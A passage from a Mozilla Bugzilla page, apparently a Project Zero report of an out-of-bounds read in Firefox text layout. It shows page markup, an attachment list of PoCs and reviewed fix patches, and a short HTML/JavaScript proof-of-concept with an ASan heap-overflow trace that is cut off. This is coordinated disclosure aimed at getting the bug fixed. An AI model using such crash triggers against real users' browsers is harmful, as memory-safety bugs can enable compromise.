    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag_type-864">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-864-dirty">
      <select id="flag_type-864" name="flag_type-864"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (5 files, 3 obsolete files)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8843258">Original PoC</a>
        </div>
        <div>
            <a href="#c9" class="attach-time activity-ref"><span class="rel-time" title="2017-03-03 02:51 PST" data-time="1488538273">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_589159" ><a class="email " href="/user_profile?user_id=589159" > <span class="fna">Ivan Fratric</span></a>
</div></span>
        </div>
        <div class="attach-info">762 bytes,
          text/html        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8843258&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8843259">Modified PoC that accesses more out-of-bounds data</a>
        </div>
        <div>
            <a href="#c10" class="attach-time activity-ref"><span class="rel-time" title="2017-03-03 02:51 PST" data-time="1488538317">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_589159" ><a class="email " href="/user_profile?user_id=589159" > <span class="fna">Ivan Fratric</span></a>
</div></span>
        </div>
        <div class="attach-info">824 bytes,
          text/html        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8843259&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8843424">wip</a>
        </div>
        <div>
            <a href="#c13" class="attach-time activity-ref"><span class="rel-time" title="2017-03-03 12:25 PST" data-time="1488572722">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_5168" ><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div></span>
        </div>
        <div class="attach-info">3.91 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8843424&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8843424&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843424">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8843463">wip2</a>
        </div>
        <div>
            <a href="#c18" class="attach-time activity-ref"><span class="rel-time" title="2017-03-03 13:43 PST" data-time="1488577411">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_5168" ><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.29 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8843463&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8843463&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843463">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8843464">wip2</a>
        </div>
        <div>
            <a href="#c19" class="attach-time activity-ref"><span class="rel-time" title="2017-03-03 13:44 PST" data-time="1488577488">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_5168" ><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.29 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8843464&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8843464&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843464">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8843571">Make gfxSkipCharsIterator a bit more robust</a>
        </div>
        <div>
            <a href="#c20" class="attach-time activity-ref"><span class="rel-time" title="2017-03-04 03:37 PST" data-time="1488627420">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_329583" ><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div></span>
        </div>
        <div class="attach-info">1.25 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_5168" ><span class="fn">mats</span>
</div>:
              <a href="#c21"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1488627420"
            >
              feedback+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8843571&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8843571&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843571">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8843917">part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.</a>
        </div>
        <div>
            <a href="#c22" class="attach-time activity-ref"><span class="rel-time" title="2017-03-06 03:54 PST" data-time="1488801279">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_5168" ><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.35 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_329583" ><span class="fn">jfkthame</span>
</div>:
              <a href="#c23"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1488801279"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_451704" ><span class="fn">lizzard</span>
</div>:
              <a href="#c32"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1489155629"
            >
              approval-mozilla-aurora+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_451704" ><span class="fn">lizzard</span>
</div>:
              <a href="#c32"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1489155629"
            >
              approval-mozilla-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_580382" ><span class="fn">jcristau</span>
</div>:
              <a href="#c34"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1489155629"
            >
              approval-mozilla-esr45+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_580382" ><span class="fn">jcristau</span>
</div>:
              <a href="#c34"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1489155629"
            >
              approval-mozilla-esr52+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_280903" ><span class="fn">abillings</span>
</div>:
              <a href="#a567396_280903"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1488823772"
            >
              sec-approval+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8843917&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8843917&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843917">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8844051">part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError</a>
        </div>
        <div>
            <a href="#c25" class="attach-time activity-ref"><span class="rel-time" title="2017-03-06 09:39 PST" data-time="1488821942">5 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_329583" ><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div></span>
        </div>
        <div class="attach-info">1.22 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_5168" ><span class="fn">mats</span>
</div>:
              <a href="#c27"
                  class="flag-name-status rel-time-title activity-ref"
                  title="5 years ago"
              data-time="1488821942"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8844051&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8844051&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8844051">Splinter Review</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="12106923" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_589159" ><img src="https://secure.gravatar.com/avatar/b046be2bb71e904ec3b1a5a1176b3443?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_589159" ><a class="email " href="/user_profile?user_id=589159" > <span class="fna">Ivan Fratric</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-01 07:56 PST" data-time="1488383809">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-0" data-comment-id="12106923">User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36

Steps to reproduce:

There is an out-of-bounds read vulnerability in Firefox. The vulnerability was confirmed on the nightly ASan build. 

Please note: This bug is subject to a 90 day disclosure deadline. If 90 days elapse without a broadly available patch, then the bug report will automatically become visible to the public.

With any fix, please give credit for identifying the vulnerability to Ivan Fratric of Google Project Zero.

PoC:

=================================================================

&lt;style&gt;
.class1 { float: left; white-space: pre-line; }
.class2 { border-bottom-style: solid; font-face: Arial; font-size: 7ex; }
&lt;/style&gt;
&lt;script&gt;
function go() {
  menuitem.appendChild(document.body.firstChild);
  canvas.toBlob(callback);
}
function callback() {
  var s = menu.style;
  s.setProperty(&quot;flex-direction&quot;, &quot;row-reverse&quot;);
  option.scrollBy();
  document.implementation.createHTMLDocument(&quot;foo&quot;).adoptNode(progress);
  s.setProperty(&quot;flex-direction&quot;, &quot;column&quot;);
  canvas.toBlob(callback);
}
&lt;/script&gt;
aaaaaaaaaaaaaaaaaa
&lt;/head&gt;
&lt;body onload=go()&gt;
&lt;del class=&quot;class1&quot;&gt;
&lt;span class=&quot;class2&quot;&gt;
&lt;menu id=&quot;menu&quot;&gt;
&lt;menuitem&gt;
&lt;/menu&gt;
&lt;menuitem id=&quot;menuitem&quot;&gt;
&lt;progress id=&quot;progress&quot;&gt;
&lt;/del&gt;
&lt;ol dir=&quot;rtl&quot;&gt;l+0&lt;/ol&gt;
&lt;canvas id=&quot;canvas&quot;&gt;
&lt;option id=&quot;option&quot;&gt;

=================================================================

ASan log:

=================================================================
==104545==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000721ecc at pc 0x7fcef25af0e8 bp 0x7ffc23afd1b0 sp 0x7ffc23afd1a8
READ of size 4 at 0x611000721ecc thread T0
    #0 0x7fcef25af0e7 in IsSimpleGlyph /home/worker/workspace/build/src/gfx/thebes/gfxFont.h:785:46
    #1 0x7fcef25af0e7 in GetAdvanceForGlyph /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.h:638
    #2 0x7fcef25af0e7 in GetAdvanceForGlyphs /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:334
    #3 0x7fcef25af0e7 in gfxTextRun::GetAdvanceWidth(gfxTextRun::Range, gfxTextRun::PropertyProvider*, gfxFont::Spacing*) const /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:1074
    #4 0x7fcef704ac7c in nsTextFrame::TrimTrailingWhiteSpace(mozilla::gfx::DrawTarget*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:9654:15
    #5 0x7fcef6d2a2ef in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2584:44
    #6 0x7fcef6d2a1c7 in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2531:11
    #7 0x7fcef6d2a1c7 in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2531:11
    #8 0x7fcef6d2b293 in nsLineLayout::TrimTrailingWhiteSpace() /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2654:3
    #9 0x7fcef6dcc03b in nsBlockFrame::PlaceLine(mozilla::BlockReflowInput&amp;, nsLineLayout&amp;, nsLineList_iterator, nsFloatManager::SavedState*, mozilla::LogicalRect&amp;, int&amp;, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4479:3
    #10 0x7fcef6dcabe3 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&amp;, nsLineLayout&amp;, nsLineList_iterator, nsFlowAreaRect&amp;, int&amp;, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4082:12
    #11 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&amp;, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9
    #12 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5
    #13 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
    #14 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
    #15 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&amp;, bool, nsCollapsingMargin&amp;, int, bool, nsLineBox*, mozilla::ReflowInput&amp;, nsReflowStatus&amp;, mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3
    #16 0x7fcef6dd9001 in nsBlockFrame::ReflowFloat(mozilla::BlockReflowInput&amp;, mozilla::LogicalRect const&amp;, nsIFrame*, mozilla::LogicalMargin&amp;, mozilla::LogicalMargin&amp;, bool, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:6272:5
    #17 0x7fcef6d4d19f in mozilla::BlockReflowInput::FlowAndPlaceFloat(nsIFrame*) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:910:5
    #18 0x7fcef6d4b143 in mozilla::BlockReflowInput::AddFloat(nsLineLayout*, nsIFrame*, int) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:627:14
    #19 0x7fcef6d21369 in AddFloat /home/worker/workspace/build/src/layout/generic/nsLineLayout.h:190:12
    #20 0x7fcef6d21369 in nsLineLayout::ReflowFrame(nsIFrame*, nsReflowStatus&amp;, mozilla::ReflowOutput*, bool&amp;) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:979
    #21 0x7fcef6dcb7bb in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&amp;, nsLineLayout&amp;, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4153:3
    #22 0x7fcef6dca446 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&amp;, nsLineLayout&amp;, nsLineList_iterator, nsFlowAreaRect&amp;, int&amp;, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3954:5
    #23 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&amp;, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9
    #24 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5
    #25 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
    #26 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
    #27 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&amp;, bool, nsCollapsingMargin&amp;, int, bool, nsLineBox*, mozilla::ReflowInput&amp;, nsReflowStatus&amp;, mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3
    #28 0x7fcef6dbc4da in nsBlockFrame::ReflowBlockFrame(mozilla::BlockReflowInput&amp;, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3462:7
    #29 0x7fcef6dafafa in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2831:5
    #30 0x7fcef6dafafa in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
    #31 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
    #32 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, mozilla::WritingMode const&amp;, mozilla::LogicalPoint const&amp;, nsSize const&amp;, unsigned int, nsReflowStatus&amp;, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3
    #33 0x7fcef6e09555 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:711:5
    #34 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, mozilla::WritingMode const&amp;, mozilla::LogicalPoint const&amp;, nsSize const&amp;, unsigned int, nsReflowStatus&amp;, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3
    #35 0x7fcef6eb0394 in nsHTMLScrollFrame::ReflowScrolledFrame(mozilla::ScrollReflowInput*, bool, bool, mozilla::ReflowOutput*, bool) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:552:3
    #36 0x7fcef6eb1840 in nsHTMLScrollFrame::ReflowContents(mozilla::ScrollReflowInput*, mozilla::ReflowOutput const&amp;) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:664:3
    #37 0x7fcef6eb5073 in nsHTMLScrollFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:1039:3
    #38 0x7fcef6e1b964 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, int, int, unsigned int, nsReflowStatus&amp;, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1072:3
    #39 0x7fcef6d8b760 in mozilla::ViewportFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:326:7
    #40 0x7fcef6b89187 in mozilla::PresShell::DoReflow(nsIFrame*, bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9202:3
    #41 0x7fcef6b9cde4 in mozilla::PresShell::ProcessReflowCommands(bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9375:24
    #42 0x7fcef6b9bcf6 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4174:11
    #43 0x7fcef2c4646e in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:598:5
    #44 0x7fcef2c4646e in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7961
    #45 0x7fcef2a1f2b4 in GetPrimaryFrame /home/worker/workspace/build/src/dom/base/Element.cpp:2164:5
    #46 0x7fcef2a1f2b4 in mozilla::dom::Element::GetScrollFrame(nsIFrame**, bool) /home/worker/workspace/build/src/dom/base/Element.cpp:637
    #47 0x7fcef2a20871 in mozilla::dom::Element::ScrollBy(mozilla::dom::ScrollToOptions const&amp;) /home/worker/workspace/build/src/dom/base/Element.cpp:794:28
